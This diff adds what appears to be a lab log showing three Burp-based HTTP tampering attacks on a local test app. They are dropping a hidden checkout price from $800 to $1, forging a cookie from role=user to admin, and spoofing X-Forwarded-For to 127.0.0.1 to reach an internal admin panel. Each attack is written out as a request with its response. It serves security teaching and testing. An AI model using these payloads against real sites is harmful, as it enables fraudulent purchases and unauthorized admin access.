@@ -1,0 +1,48 @@
+############################################################
+# MANIPULATION 1 — HIDDEN FORM FIELD TAMPERING (price)
+#   Burp: intercept POST /checkout, edit hidden 'price' field
+############################################################
+
+----- ORIGINAL request (as the browser/form sends it) -----
+POST /checkout HTTP/1.1   Host: 127.0.0.1:5000
+Content-Type: application/x-www-form-urlencoded
+Body: product=laptop&price=800
+----- Application RESPONSE -----
+Order placed: laptop charged at $800
+
+----- MODIFIED request (price tampered in Burp: 800 -> 1) -----
+Body: product=laptop&price=1
+----- Application RESPONSE -----
+Order placed: laptop charged at $1
+
+############################################################
+# MANIPULATION 2 — SESSION COOKIE TAMPERING (role)
+#   Burp: intercept request to /dashboard, edit Cookie role=user -> admin
+############################################################
+
+----- ORIGINAL request (cookie role=user) -----
+GET /dashboard   Cookie: role=user
+----- Application RESPONSE -----
+User dashboard (role=user). Admin area hidden.
+
+----- MODIFIED request (cookie role=admin) -----
+GET /dashboard   Cookie: role=admin
+----- Application RESPONSE -----
+ADMIN DASHBOARD: all users, all orders, settings.
+
+############################################################
+# MANIPULATION 3 — REQUEST HEADER TAMPERING (X-Forwarded-For)
+#   Burp: intercept GET /admin, add/edit X-Forwarded-For header
+############################################################
+
+----- ORIGINAL request (no X-Forwarded-For) -----
+GET /admin
+----- Application RESPONSE -----
+403 Forbidden: admin panel is internal-only.
+   [HTTP 403]
+
+----- MODIFIED request (spoofed X-Forwarded-For: 127.0.0.1) -----
+GET /admin   X-Forwarded-For: 127.0.0.1
+----- Application RESPONSE -----
+ADMIN PANEL (internal access granted via X-Forwarded-For).
+   [HTTP 200]
